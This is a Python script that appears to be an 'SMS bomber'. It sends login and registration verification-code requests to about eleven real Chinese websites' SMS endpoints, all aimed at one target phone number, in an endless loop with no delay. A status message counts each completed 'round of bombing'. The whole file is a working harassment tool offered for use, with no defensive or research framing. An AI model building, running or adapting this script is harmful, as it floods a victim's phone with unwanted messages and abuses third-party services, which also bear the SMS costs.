import requests
import json
import time
import random

# post地址 post参数
APIS = [
    # 赛雷网游加速器
    {
        'url': 'https://api.cpspeed.com/index/verify-code',
        'body': {
            'login_type': '1', 'telephone': '手机号码', 'verify_code': '', 'scenario': 'login-dynamic-code',
            'redirect_url': 'https://client.cpspeed.com//login/success', 'mac': '', 'channel_id': ''
        }
    },
    # 带我去  频率限制 1分钟
    {
        'url': 'https://accounts.daiwoqu.com/api',
        'body': {
            'type': 'login_yzm', 'phone': '手机号码', 'kind': 'login_yzm',
        }
    },
    # 中国人事考试图书网
    {
        'url': 'https://rsks.class.com.cn/sysuser/fg/member/code?type=1&smsEnum=0&phone=手机号码&email=',
    },
    # CNMO
    {
        'url': 'http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery18306147606011785998_时间1&mobile=手机号码&type=5&_=时间2',
        'headers': {
            'Referer': 'http://passport.cnmo.com/'
        }
    },
    # 华测云
    {
        'url': 'http://cloud.huacenav.com:9000/Account/Auth/GetPhoneCode',
        'body': {
            'phoneno': '手机号码',
        },
    },
    # wedo
    {
        'url': 'http://www.wedoone.cn/reg/getPhoneCode.action',
        'body': {
            'phoneNum': '手机号码',
        },
    },
    # shareinstall
    {
        'url': 'http://api.shareinstall.com.cn/login/sendmessage',
        'body': {
            'mobile': '手机号码', 'type': '1'
        }
    },
    # xueersi
    {
        'url': 'https://reg.xueersi.com/RegV1/sendVcode',
        'body': {
            'phone': '手机号码'
        },
        'headers': {
            'Referer': 'https://zt.xueersi.com/zaixian/pc-zhu-tiyanke/quanke/indexa.html?xeswx_sourceid=124550308&xeswx_adsiteid=731779&xeswx_siteid=272&&hot_url=aHR0cHM6Ly9hcnRlbWlzLnh1ZWVyc2kuY29tL3hlcy5waHA/c291cmNlPTEyNDU1MDMwOCZzaXRlX2lkPTI3MiZhZHNpdGVfaWQ9NzMxNzc5JmJkX3ZpZD01Nzk5MzUwNzkxOTYzMDQzMjk3Jm9jcGNfcmVwb3J0PWElM0E1JTNBJTdCcyUzQTYlM0ElMjJiZF92aWQlMjIlM0JzJTNBMTklM0ElMjI1Nzk5MzUwNzkxOTYzMDQzMjk3JTIyJTNCcyUzQTglM0ElMjJjbGlja19pZCUyMiUzQnMlM0ExOSUzQSUyMjU3OTkzNTA3OTE5NjMwNDMyOTclMjIlM0JzJTNBOSUzQSUyMnNvdXJjZV9pZCUyMiUzQmklM0ExMjQ1NTAzMDglM0JzJTNBMTElM0ElMjJjdXN0b21lcl9pZCUyMiUzQmklM0EyNzIlM0JzJTNBNyUzQSUyMmhvdF91cmwlMjIlM0JzJTNBMTQ0JTNBJTIyYUhSMGNEb3ZMMkZ5ZEdWdGFYTXVlSFZsWlhKemFTNWpiMjB2ZUdWekxuQm9jRDl6YjNWeVkyVTlNVEkwTlRVd016QTRKbk5wZEdWZmFXUTlNamN5Sm1Ga2MybDBaVjlwWkQwM016RTNOemttWW1SZmRtbGtQVFUzT1Rrek5UQTNPVEU1TmpNd05ETXlPVGMlM0QlMjIlM0IlN0QmbV9jaGFubmVsPWhvdA=='
        }
    },
    # yingsheng
    {
        'url': 'https://sso.yingsheng.com/crosApi',
        'body': 'Cs25"sso_getRegisterMobileCode"a1{s11"手机号码"}z',
    },
    # baixing
    {
        'url': 'https://www.baixing.com/oz/verify/reg?mobile=手机号码',
    },
    # 51sxue
    {
        'url': 'http://www.51sxue.com/index.php',
        'body': {
            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username':'456dadad'
        }
    },
]


def sendSMS(API, phone):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    }
    if API.get('headers'):
        headers.update(API.get('headers'))
    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(int(time.time() * 1000)))
    body = API.get('body')
    try:
        if body:
            body = eval(str(body).replace("手机号码", phone)) if isinstance(body, dict) else body.replace("手机号码", phone)
            r = requests.post(url, body, headers=headers)
        else:
            r = requests.get(url, headers=headers)
        # print(r.status_code)
        # print(r.text)
        # print(json.loads(r.text))
    except:
        ...


def main(phone):
    i = 1
    while i > 0:
        for API in APIS:
            sendSMS(API, phone)
            # time.sleep(random.randint(1, 3))
            time.sleep(0)
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i+1}轮轰炸！")
        time.sleep(0)
        i += 1

if __name__ == '__main__':
    # 手机号
    phone = '185xxxxxxxx'
    # sendSMS(APIS[-1], phone)
    main(phone)
